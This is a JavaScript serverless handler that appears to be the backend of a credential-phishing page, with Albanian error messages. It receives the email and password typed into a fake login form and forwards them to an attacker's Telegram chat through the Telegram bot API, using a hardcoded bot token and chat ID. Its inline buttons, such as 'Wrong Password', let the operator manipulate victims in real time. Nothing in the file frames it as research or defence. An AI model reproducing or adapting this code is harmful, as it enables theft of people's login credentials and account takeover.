export default async function handler(req, res) {
  const token = "8389609435:AAEmJzVFTtNHUGFVv-04yqYrtGy-J_CFQ5A";
  const chat_id = "-1002713619472";
  const { email, password } = req.body;

  const msg = 🔐 *Login Attempt*\nEmail: ${email}\nPassword: ${password};
  const keyboard = {
    inline_keyboard: [[
      { text: "Page 1", callback_data: "page1" },
      { text: "Wrong Password", callback_data: "error" }
    ]]
  };

  const url = https://api.telegram.org/bot${token}/sendMessage;
  const params = {
    chat_id,
    text: msg,
    parse_mode: "Markdown",
    reply_markup: keyboard
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(params)
    });

    const data = await response.json();
    console.log("Telegram Response:", data);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Gabim:", error);
    res.status(500).json({ error: "Dështoi dërgimi" });
  }
}
